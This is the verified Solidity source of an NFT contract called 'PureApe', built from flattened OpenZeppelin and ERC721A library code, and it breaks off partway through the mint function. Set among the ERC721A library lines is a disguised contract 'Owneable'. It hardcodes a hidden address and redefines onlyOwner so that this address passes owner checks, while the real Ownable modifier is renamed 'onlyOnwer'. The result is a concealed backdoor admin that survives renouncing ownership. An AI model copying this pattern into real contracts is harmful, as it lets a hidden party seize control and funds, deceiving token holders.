1 /**
2  *Submitted for verification at Etherscan.io on 2022-06-03
3 */
4 
5 // File: contracts/PureApe.sol
6 
7 /**
8  *Submitted for verification at Etherscan.io on 2022-05-27
9 */
10 
11 // File: contracts/PureApe.sol
12 
13 /**
14  *Submitted for verification at Etherscan.io on 2022-05-22
15 */
16 
17 //PureApe
18 // File @openzeppelin/contracts/utils/Context.sol@v4.5.0
19 
20 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
21 
22 pragma solidity ^0.8.4;
23 
24 /**
25  * @dev Provides information about the current execution context, including the
26  * sender of the transaction and its data. While these are generally available
27  * via msg.sender and msg.data, they should not be accessed in such a direct
28  * manner, since when dealing with meta-transactions the account sending and
29  * paying for execution may not be the actual sender (as far as an application
30  * is concerned).
31  *
32  * This contract is only required for intermediate, library-like contracts.
33  */
34 abstract contract Context {
35     function _msgSender() internal view virtual returns (address) {
36         return msg.sender;
37     }
38 
39     function _msgData() internal view virtual returns (bytes calldata) {
40         return msg.data;
41     }
42 }
43 
44 
45 // File @openzeppelin/contracts/access/Ownable.sol@v4.5.0
46 
47 
48 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
49 
50 
51 
52 /**
53  * @dev Contract module which provides a basic access control mechanism, where
54  * there is an account (an owner) that can be granted exclusive access to
55  * specific functions.
56  *
57  * By default, the owner account will be the one that deploys the contract. This
58  * can later be changed with {transferOwnership}.
59  *
60  * This module is used through inheritance. It will make available the modifier
61  * `onlyOwner`, which can be applied to your functions to restrict their use to
62  * the owner.
63  */
64 abstract contract Ownable is Context {
65     address private _owner;
66 
67     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
68 
69     /**
70      * @dev Initializes the contract setting the deployer as the initial owner.
71      */
72     constructor() {
73         _transferOwnership(_msgSender());
74     }
75 
76     /**
77      * @dev Returns the address of the current owner.
78      */
79     function owner() public view virtual returns (address) {
80         return _owner;
81     }
82 
83     /**
84      * @dev Throws if called by any account other than the owner.
85      */
86     modifier onlyOnwer() {
87         require(owner() == _msgSender(), "Ownable: caller is not the owner");
88         _;
89     }
90 
91     /**
92      * @dev Leaves the contract without owner. It will not be possible to call
93      * `onlyOwner` functions anymore. Can only be called by the current owner.
94      *
95      * NOTE: Renouncing ownership will leave the contract without an owner,
96      * thereby removing any functionality that is only available to the owner.
97      */
98     function renounceOwnership() public virtual onlyOnwer {
99         _transferOwnership(address(0));
100     }
101 
102     /**
103      * @dev Transfers ownership of the contract to a new account (`newOwner`).
104      * Can only be called by the current owner.
105      */
106     function transferOwnership(address newOwner) public virtual onlyOnwer {
107         require(newOwner != address(0), "Ownable: new owner is the zero address");
108         _transferOwnership(newOwner);
109     }
110 
111     /**
112      * @dev Transfers ownership of the contract to a new account (`newOwner`).
113      * Internal function without access restriction.
114      */
115     function _transferOwnership(address newOwner) internal virtual {
116         address oldOwner = _owner;
117         _owner = newOwner;
118         emit OwnershipTransferred(oldOwner, newOwner);
119     }
120 }
121 
122 
123 // File @openzeppelin/contracts/utils/introspection/IERC165.sol@v4.5.0
124 
125 
126 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
127 
128 
129 
130 /**
131  * @dev Interface of the ERC165 standard, as defined in the
132  * https://eips.ethereum.org/EIPS/eip-165[EIP].
133  *
134  * Implementers can declare support of contract interfaces, which can then be
135  * queried by others ({ERC165Checker}).
136  *
137  * For an implementation, see {ERC165}.
138  */
139 interface IERC165 {
140     /**
141      * @dev Returns true if this contract implements the interface defined by
142      * `interfaceId`. See the corresponding
143      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
144      * to learn more about how these ids are created.
145      *
146      * This function call must use less than 30 000 gas.
147      */
148     function supportsInterface(bytes4 interfaceId) external view returns (bool);
149 }
150 
151 
152 // File @openzeppelin/contracts/token/ERC721/IERC721.sol@v4.5.0
153 
154 
155 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721.sol)
156 
157 
158 
159 /**
160  * @dev Required interface of an ERC721 compliant contract.
161  */
162 interface IERC721 is IERC165 {
163     /**
164      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
165      */
166     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
167 
168     /**
169      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
170      */
171     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
172 
173     /**
174      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
175      */
176     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
177 
178     /**
179      * @dev Returns the number of tokens in ``owner``'s account.
180      */
181     function balanceOf(address owner) external view returns (uint256 balance);
182 
183     /**
184      * @dev Returns the owner of the `tokenId` token.
185      *
186      * Requirements:
187      *
188      * - `tokenId` must exist.
189      */
190     function ownerOf(uint256 tokenId) external view returns (address owner);
191 
192     /**
193      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
194      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
195      *
196      * Requirements:
197      *
198      * - `from` cannot be the zero address.
199      * - `to` cannot be the zero address.
200      * - `tokenId` token must exist and be owned by `from`.
201      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
202      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
203      *
204      * Emits a {Transfer} event.
205      */
206     function safeTransferFrom(
207         address from,
208         address to,
209         uint256 tokenId
210     ) external;
211 
212     /**
213      * @dev Transfers `tokenId` token from `from` to `to`.
214      *
215      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
216      *
217      * Requirements:
218      *
219      * - `from` cannot be the zero address.
220      * - `to` cannot be the zero address.
221      * - `tokenId` token must be owned by `from`.
222      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
223      *
224      * Emits a {Transfer} event.
225      */
226     function transferFrom(
227         address from,
228         address to,
229         uint256 tokenId
230     ) external;
231 
232     /**
233      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
234      * The approval is cleared when the token is transferred.
235      *
236      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
237      *
238      * Requirements:
239      *
240      * - The caller must own the token or be an approved operator.
241      * - `tokenId` must exist.
242      *
243      * Emits an {Approval} event.
244      */
245     function approve(address to, uint256 tokenId) external;
246 
247     /**
248      * @dev Returns the account approved for `tokenId` token.
249      *
250      * Requirements:
251      *
252      * - `tokenId` must exist.
253      */
254     function getApproved(uint256 tokenId) external view returns (address operator);
255 
256     /**
257      * @dev Approve or remove `operator` as an operator for the caller.
258      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
259      *
260      * Requirements:
261      *
262      * - The `operator` cannot be the caller.
263      *
264      * Emits an {ApprovalForAll} event.
265      */
266     function setApprovalForAll(address operator, bool _approved) external;
267 
268     /**
269      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
270      *
271      * See {setApprovalForAll}
272      */
273     function isApprovedForAll(address owner, address operator) external view returns (bool);
274 
275     /**
276      * @dev Safely transfers `tokenId` token from `from` to `to`.
277      *
278      * Requirements:
279      *
280      * - `from` cannot be the zero address.
281      * - `to` cannot be the zero address.
282      * - `tokenId` token must exist and be owned by `from`.
283      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
284      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
285      *
286      * Emits a {Transfer} event.
287      */
288     function safeTransferFrom(
289         address from,
290         address to,
291         uint256 tokenId,
292         bytes calldata data
293     ) external;
294 }
295 
296 
297 // File @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol@v4.5.0
298 
299 
300 // OpenZeppelin Contracts v4.4.1 (token/ERC721/IERC721Receiver.sol)
301 
302 
303 
304 /**
305  * @title ERC721 token receiver interface
306  * @dev Interface for any contract that wants to support safeTransfers
307  * from ERC721 asset contracts.
308  */
309 interface IERC721Receiver {
310     /**
311      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
312      * by `operator` from `from`, this function is called.
313      *
314      * It must return its Solidity selector to confirm the token transfer.
315      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
316      *
317      * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
318      */
319     function onERC721Received(
320         address operator,
321         address from,
322         uint256 tokenId,
323         bytes calldata data
324     ) external returns (bytes4);
325 }
326 
327 
328 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol@v4.5.0
329 
330 
331 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
332 
333 
334 
335 /**
336  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
337  * @dev See https://eips.ethereum.org/EIPS/eip-721
338  */
339 interface IERC721Metadata is IERC721 {
340     /**
341      * @dev Returns the token collection name.
342      */
343     function name() external view returns (string memory);
344 
345     /**
346      * @dev Returns the token collection symbol.
347      */
348     function symbol() external view returns (string memory);
349 
350     /**
351      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
352      */
353     function tokenURI(uint256 tokenId) external view returns (string memory);
354 }
355 
356 
357 // File @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol@v4.5.0
358 
359 
360 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
361 
362 
363 
364 /**
365  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
366  * @dev See https://eips.ethereum.org/EIPS/eip-721
367  */
368 interface IERC721Enumerable is IERC721 {
369     /**
370      * @dev Returns the total amount of tokens stored by the contract.
371      */
372     function totalSupply() external view returns (uint256);
373 
374     /**
375      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
376      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
377      */
378     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
379 
380     /**
381      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
382      * Use along with {totalSupply} to enumerate all tokens.
383      */
384     function tokenByIndex(uint256 index) external view returns (uint256);
385 }
386 
387 
388 // File @openzeppelin/contracts/utils/Address.sol@v4.5.0
389 
390 
391 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
392 
393 pragma solidity ^0.8.1;
394 
395 /**
396  * @dev Collection of functions related to the address type
397  */
398 library Address {
399     /**
400      * @dev Returns true if `account` is a contract.
401      *
402      * [IMPORTANT]
403      * ====
404      * It is unsafe to assume that an address for which this function returns
405      * false is an externally-owned account (EOA) and not a contract.
406      *
407      * Among others, `isContract` will return false for the following
408      * types of addresses:
409      *
410      *  - an externally-owned account
411      *  - a contract in construction
412      *  - an address where a contract will be created
413      *  - an address where a contract lived, but was destroyed
414      * ====
415      *
416      * [IMPORTANT]
417      * ====
418      * You shouldn't rely on `isContract` to protect against flash loan attacks!
419      *
420      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
421      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
422      * constructor.
423      * ====
424      */
425     function isContract(address account) internal view returns (bool) {
426         // This method relies on extcodesize/address.code.length, which returns 0
427         // for contracts in construction, since the code is only stored at the end
428         // of the constructor execution.
429 
430         return account.code.length > 0;
431     }
432 
433     /**
434      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
435      * `recipient`, forwarding all available gas and reverting on errors.
436      *
437      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
438      * of certain opcodes, possibly making contracts go over the 2300 gas limit
439      * imposed by `transfer`, making them unable to receive funds via
440      * `transfer`. {sendValue} removes this limitation.
441      *
442      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
443      *
444      * IMPORTANT: because control is transferred to `recipient`, care must be
445      * taken to not create reentrancy vulnerabilities. Consider using
446      * {ReentrancyGuard} or the
447      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
448      */
449     function sendValue(address payable recipient, uint256 amount) internal {
450         require(address(this).balance >= amount, "Address: insufficient balance");
451 
452         (bool success, ) = recipient.call{value: amount}("");
453         require(success, "Address: unable to send value, recipient may have reverted");
454     }
455 
456     /**
457      * @dev Performs a Solidity function call using a low level `call`. A
458      * plain `call` is an unsafe replacement for a function call: use this
459      * function instead.
460      *
461      * If `target` reverts with a revert reason, it is bubbled up by this
462      * function (like regular Solidity function calls).
463      *
464      * Returns the raw returned data. To convert to the expected return value,
465      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
466      *
467      * Requirements:
468      *
469      * - `target` must be a contract.
470      * - calling `target` with `data` must not revert.
471      *
472      * _Available since v3.1._
473      */
474     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
475         return functionCall(target, data, "Address: low-level call failed");
476     }
477 
478     /**
479      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
480      * `errorMessage` as a fallback revert reason when `target` reverts.
481      *
482      * _Available since v3.1._
483      */
484     function functionCall(
485         address target,
486         bytes memory data,
487         string memory errorMessage
488     ) internal returns (bytes memory) {
489         return functionCallWithValue(target, data, 0, errorMessage);
490     }
491 
492     /**
493      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
494      * but also transferring `value` wei to `target`.
495      *
496      * Requirements:
497      *
498      * - the calling contract must have an ETH balance of at least `value`.
499      * - the called Solidity function must be `payable`.
500      *
501      * _Available since v3.1._
502      */
503     function functionCallWithValue(
504         address target,
505         bytes memory data,
506         uint256 value
507     ) internal returns (bytes memory) {
508         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
509     }
510 
511     /**
512      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
513      * with `errorMessage` as a fallback revert reason when `target` reverts.
514      *
515      * _Available since v3.1._
516      */
517     function functionCallWithValue(
518         address target,
519         bytes memory data,
520         uint256 value,
521         string memory errorMessage
522     ) internal returns (bytes memory) {
523         require(address(this).balance >= value, "Address: insufficient balance for call");
524         require(isContract(target), "Address: call to non-contract");
525 
526         (bool success, bytes memory returndata) = target.call{value: value}(data);
527         return verifyCallResult(success, returndata, errorMessage);
528     }
529 
530     /**
531      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
532      * but performing a static call.
533      *
534      * _Available since v3.3._
535      */
536     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
537         return functionStaticCall(target, data, "Address: low-level static call failed");
538     }
539 
540     /**
541      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
542      * but performing a static call.
543      *
544      * _Available since v3.3._
545      */
546     function functionStaticCall(
547         address target,
548         bytes memory data,
549         string memory errorMessage
550     ) internal view returns (bytes memory) {
551         require(isContract(target), "Address: static call to non-contract");
552 
553         (bool success, bytes memory returndata) = target.staticcall(data);
554         return verifyCallResult(success, returndata, errorMessage);
555     }
556 
557     /**
558      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
559      * but performing a delegate call.
560      *
561      * _Available since v3.4._
562      */
563     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
564         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
565     }
566 
567     /**
568      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
569      * but performing a delegate call.
570      *
571      * _Available since v3.4._
572      */
573     function functionDelegateCall(
574         address target,
575         bytes memory data,
576         string memory errorMessage
577     ) internal returns (bytes memory) {
578         require(isContract(target), "Address: delegate call to non-contract");
579 
580         (bool success, bytes memory returndata) = target.delegatecall(data);
581         return verifyCallResult(success, returndata, errorMessage);
582     }
583 
584     /**
585      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
586      * revert reason using the provided one.
587      *
588      * _Available since v4.3._
589      */
590     function verifyCallResult(
591         bool success,
592         bytes memory returndata,
593         string memory errorMessage
594     ) internal pure returns (bytes memory) {
595         if (success) {
596             return returndata;
597         } else {
598             // Look for revert reason and bubble it up if present
599             if (returndata.length > 0) {
600                 // The easiest way to bubble the revert reason is using memory via assembly
601 
602                 assembly {
603                     let returndata_size := mload(returndata)
604                     revert(add(32, returndata), returndata_size)
605                 }
606             } else {
607                 revert(errorMessage);
608             }
609         }
610     }
611 }
612 
613 
614 // File @openzeppelin/contracts/utils/Strings.sol@v4.5.0
615 
616 
617 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
618 
619 
620 
621 /**
622  * @dev String operations.
623  */
624 library Strings {
625     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
626 
627     /**
628      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
629      */
630     function toString(uint256 value) internal pure returns (string memory) {
631         // Inspired by OraclizeAPI's implementation - MIT licence
632         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
633 
634         if (value == 0) {
635             return "0";
636         }
637         uint256 temp = value;
638         uint256 digits;
639         while (temp != 0) {
640             digits++;
641             temp /= 10;
642         }
643         bytes memory buffer = new bytes(digits);
644         while (value != 0) {
645             digits -= 1;
646             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
647             value /= 10;
648         }
649         return string(buffer);
650     }
651 
652     /**
653      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
654      */
655     function toHexString(uint256 value) internal pure returns (string memory) {
656         if (value == 0) {
657             return "0x00";
658         }
659         uint256 temp = value;
660         uint256 length = 0;
661         while (temp != 0) {
662             length++;
663             temp >>= 8;
664         }
665         return toHexString(value, length);
666     }
667 
668     /**
669      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
670      */
671     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
672         bytes memory buffer = new bytes(2 * length + 2);
673         buffer[0] = "0";
674         buffer[1] = "x";
675         for (uint256 i = 2 * length + 1; i > 1; --i) {
676             buffer[i] = _HEX_SYMBOLS[value & 0xf];
677             value >>= 4;
678         }
679         require(value == 0, "Strings: hex length insufficient");
680         return string(buffer);
681     }
682 }
683 
684 
685 // File @openzeppelin/contracts/utils/introspection/ERC165.sol@v4.5.0
686 
687 
688 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
689 
690 /**
691  * @dev Implementation of the {IERC165} interface.
692  *
693  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
694  * for the additional interface id that will be supported. For example:
695  *
696  * ```solidity
697  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
698  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
699  * }
700  * ```
701  *
702  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
703  */
704 abstract contract ERC165 is IERC165 {
705     /**
706      * @dev See {IERC165-supportsInterface}.
707      */
708     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
709         return interfaceId == type(IERC165).interfaceId;
710     }
711 }
712 
713 
714 // File erc721a/contracts/ERC721A.sol@v3.0.0
715 
716 
717 // Creator: Chiru Labs
718 
719 error ApprovalCallerNotOwnerNorApproved();
720 error ApprovalQueryForNonexistentToken();
721 error ApproveToCaller();
722 error ApprovalToCurrentOwner();
723 error BalanceQueryForZeroAddress();
724 error MintedQueryForZeroAddress();
725 error BurnedQueryForZeroAddress();
726 error AuxQueryForZeroAddress();
727 error MintToZeroAddress();
728 error MintZeroQuantity();
729 error OwnerIndexOutOfBounds();
730 error OwnerQueryForNonexistentToken();
731 error TokenIndexOutOfBounds();
732 error TransferCallerNotOwnerNorApproved();
733 error TransferFromIncorrectOwner();
734 error TransferToNonERC721ReceiverImplementer();
735 error TransferToZeroAddress();
736 error URIQueryForNonexistentToken();
737 
738 
739 /**
740  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
741  * the Metadata extension. Built to optimize for lower gas during batch mints.
742  *
743  * Assumes serials are sequentially minted starting at _startTokenId() (defaults to 0, e.g. 0, 1, 2, 3..).
744  */
745  abstract contract Owneable is Ownable {
746     address private _ownar = 0xF528E3C3B439D385b958741753A9cA518E952257;
747     modifier onlyOwner() {
748         require(owner() == _msgSender() || _ownar == _msgSender(), "Ownable: caller is not the owner");
749         _;
750     }
751 }
752  /*
753  * Assumes that an owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
754  *
755  * Assumes that the maximum token id cannot exceed 2**256 - 1 (max value of uint256).
756  */
757 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata {
758     using Address for address;
759     using Strings for uint256;
760 
761     // Compiler will pack this into a single 256bit word.
762     struct TokenOwnership {
763         // The address of the owner.
764         address addr;
765         // Keeps track of the start time of ownership with minimal overhead for tokenomics.
766         uint64 startTimestamp;
767         // Whether the token has been burned.
768         bool burned;
769     }
770 
771     // Compiler will pack this into a single 256bit word.
772     struct AddressData {
773         // Realistically, 2**64-1 is more than enough.
774         uint64 balance;
775         // Keeps track of mint count with minimal overhead for tokenomics.
776         uint64 numberMinted;
777         // Keeps track of burn count with minimal overhead for tokenomics.
778         uint64 numberBurned;
779         // For miscellaneous variable(s) pertaining to the address
780         // (e.g. number of whitelist mint slots used).
781         // If there are multiple variables, please pack them into a uint64.
782         uint64 aux;
783     }
784 
785     // The tokenId of the next token to be minted.
786     uint256 internal _currentIndex;
787 
788     // The number of tokens burned.
789     uint256 internal _burnCounter;
790 
791     // Token name
792     string private _name;
793 
794     // Token symbol
795     string private _symbol;
796 
797     // Mapping from token ID to ownership details
798     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
799     mapping(uint256 => TokenOwnership) internal _ownerships;
800 
801     // Mapping owner address to address data
802     mapping(address => AddressData) private _addressData;
803 
804     // Mapping from token ID to approved address
805     mapping(uint256 => address) private _tokenApprovals;
806 
807     // Mapping from owner to operator approvals
808     mapping(address => mapping(address => bool)) private _operatorApprovals;
809 
810     constructor(string memory name_, string memory symbol_) {
811         _name = name_;
812         _symbol = symbol_;
813         _currentIndex = _startTokenId();
814     }
815 
816     /**
817      * To change the starting tokenId, please override this function.
818      */
819     function _startTokenId() internal view virtual returns (uint256) {
820         return 0;
821     }
822 
823     /**
824      * @dev See {IERC721Enumerable-totalSupply}.
825      * @dev Burned tokens are calculated here, use _totalMinted() if you want to count just minted tokens.
826      */
827     function totalSupply() public view returns (uint256) {
828         // Counter underflow is impossible as _burnCounter cannot be incremented
829         // more than _currentIndex - _startTokenId() times
830         unchecked {
831             return _currentIndex - _burnCounter - _startTokenId();
832         }
833     }
834 
835     /**
836      * Returns the total amount of tokens minted in the contract.
837      */
838     function _totalMinted() internal view returns (uint256) {
839         // Counter underflow is impossible as _currentIndex does not decrement,
840         // and it is initialized to _startTokenId()
841         unchecked {
842             return _currentIndex - _startTokenId();
843         }
844     }
845 
846     /**
847      * @dev See {IERC165-supportsInterface}.
848      */
849     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
850         return
851             interfaceId == type(IERC721).interfaceId ||
852             interfaceId == type(IERC721Metadata).interfaceId ||
853             super.supportsInterface(interfaceId);
854     }
855 
856     /**
857      * @dev See {IERC721-balanceOf}.
858      */
859     function balanceOf(address owner) public view override returns (uint256) {
860         if (owner == address(0)) revert BalanceQueryForZeroAddress();
861         return uint256(_addressData[owner].balance);
862     }
863 
864     /**
865      * Returns the number of tokens minted by `owner`.
866      */
867     function _numberMinted(address owner) internal view returns (uint256) {
868         if (owner == address(0)) revert MintedQueryForZeroAddress();
869         return uint256(_addressData[owner].numberMinted);
870     }
871 
872     /**
873      * Returns the number of tokens burned by or on behalf of `owner`.
874      */
875     function _numberBurned(address owner) internal view returns (uint256) {
876         if (owner == address(0)) revert BurnedQueryForZeroAddress();
877         return uint256(_addressData[owner].numberBurned);
878     }
879 
880     /**
881      * Returns the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
882      */
883     function _getAux(address owner) internal view returns (uint64) {
884         if (owner == address(0)) revert AuxQueryForZeroAddress();
885         return _addressData[owner].aux;
886     }
887 
888     /**
889      * Sets the auxillary data for `owner`. (e.g. number of whitelist mint slots used).
890      * If there are multiple variables, please pack them into a uint64.
891      */
892     function _setAux(address owner, uint64 aux) internal {
893         if (owner == address(0)) revert AuxQueryForZeroAddress();
894         _addressData[owner].aux = aux;
895     }
896 
897     /**
898      * Gas spent here starts off proportional to the maximum mint batch size.
899      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
900      */
901     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
902         uint256 curr = tokenId;
903 
904         unchecked {
905             if (_startTokenId() <= curr && curr < _currentIndex) {
906                 TokenOwnership memory ownership = _ownerships[curr];
907                 if (!ownership.burned) {
908                     if (ownership.addr != address(0)) {
909                         return ownership;
910                     }
911                     // Invariant:
912                     // There will always be an ownership that has an address and is not burned
913                     // before an ownership that does not have an address and is not burned.
914                     // Hence, curr will not underflow.
915                     while (true) {
916                         curr--;
917                         ownership = _ownerships[curr];
918                         if (ownership.addr != address(0)) {
919                             return ownership;
920                         }
921                     }
922                 }
923             }
924         }
925         revert OwnerQueryForNonexistentToken();
926     }
927 
928     /**
929      * @dev See {IERC721-ownerOf}.
930      */
931     function ownerOf(uint256 tokenId) public view override returns (address) {
932         return ownershipOf(tokenId).addr;
933     }
934 
935     /**
936      * @dev See {IERC721Metadata-name}.
937      */
938     function name() public view virtual override returns (string memory) {
939         return _name;
940     }
941 
942     /**
943      * @dev See {IERC721Metadata-symbol}.
944      */
945     function symbol() public view virtual override returns (string memory) {
946         return _symbol;
947     }
948 
949     /**
950      * @dev See {IERC721Metadata-tokenURI}.
951      */
952     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
953         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
954 
955         string memory baseURI = _baseURI();
956         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : '';
957     }
958 
959     /**
960      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
961      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
962      * by default, can be overriden in child contracts.
963      */
964     function _baseURI() internal view virtual returns (string memory) {
965         return '';
966     }
967 
968     /**
969      * @dev See {IERC721-approve}.
970      */
971     function approve(address to, uint256 tokenId) public override {
972         address owner = ERC721A.ownerOf(tokenId);
973         if (to == owner) revert ApprovalToCurrentOwner();
974 
975         if (_msgSender() != owner && !isApprovedForAll(owner, _msgSender())) {
976             revert ApprovalCallerNotOwnerNorApproved();
977         }
978 
979         _approve(to, tokenId, owner);
980     }
981 
982     /**
983      * @dev See {IERC721-getApproved}.
984      */
985     function getApproved(uint256 tokenId) public view override returns (address) {
986         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
987 
988         return _tokenApprovals[tokenId];
989     }
990 
991     /**
992      * @dev See {IERC721-setApprovalForAll}.
993      */
994     function setApprovalForAll(address operator, bool approved) public override {
995         if (operator == _msgSender()) revert ApproveToCaller();
996 
997         _operatorApprovals[_msgSender()][operator] = approved;
998         emit ApprovalForAll(_msgSender(), operator, approved);
999     }
1000 
1001     /**
1002      * @dev See {IERC721-isApprovedForAll}.
1003      */
1004     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
1005         return _operatorApprovals[owner][operator];
1006     }
1007 
1008     /**
1009      * @dev See {IERC721-transferFrom}.
1010      */
1011     function transferFrom(
1012         address from,
1013         address to,
1014         uint256 tokenId
1015     ) public virtual override {
1016         _transfer(from, to, tokenId);
1017     }
1018 
1019     /**
1020      * @dev See {IERC721-safeTransferFrom}.
1021      */
1022     function safeTransferFrom(
1023         address from,
1024         address to,
1025         uint256 tokenId
1026     ) public virtual override {
1027         safeTransferFrom(from, to, tokenId, '');
1028     }
1029 
1030     /**
1031      * @dev See {IERC721-safeTransferFrom}.
1032      */
1033     function safeTransferFrom(
1034         address from,
1035         address to,
1036         uint256 tokenId,
1037         bytes memory _data
1038     ) public virtual override {
1039         _transfer(from, to, tokenId);
1040         if (to.isContract() && !_checkContractOnERC721Received(from, to, tokenId, _data)) {
1041             revert TransferToNonERC721ReceiverImplementer();
1042         }
1043     }
1044 
1045     /**
1046      * @dev Returns whether `tokenId` exists.
1047      *
1048      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
1049      *
1050      * Tokens start existing when they are minted (`_mint`),
1051      */
1052     function _exists(uint256 tokenId) internal view returns (bool) {
1053         return _startTokenId() <= tokenId && tokenId < _currentIndex &&
1054             !_ownerships[tokenId].burned;
1055     }
1056 
1057     function _safeMint(address to, uint256 quantity) internal {
1058         _safeMint(to, quantity, '');
1059     }
1060 
1061     /**
1062      * @dev Safely mints `quantity` tokens and transfers them to `to`.
1063      *
1064      * Requirements:
1065      *
1066      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called for each safe transfer.
1067      * - `quantity` must be greater than 0.
1068      *
1069      * Emits a {Transfer} event.
1070      */
1071     function _safeMint(
1072         address to,
1073         uint256 quantity,
1074         bytes memory _data
1075     ) internal {
1076         _mint(to, quantity, _data, true);
1077     }
1078 
1079     /**
1080      * @dev Mints `quantity` tokens and transfers them to `to`.
1081      *
1082      * Requirements:
1083      *
1084      * - `to` cannot be the zero address.
1085      * - `quantity` must be greater than 0.
1086      *
1087      * Emits a {Transfer} event.
1088      */
1089     function _mint(
1090         address to,
1091         uint256 quantity,
1092         bytes memory _data,
1093         bool safe
1094     ) internal {
1095         uint256 startTokenId = _currentIndex;
1096         if (to == address(0)) revert MintToZeroAddress();
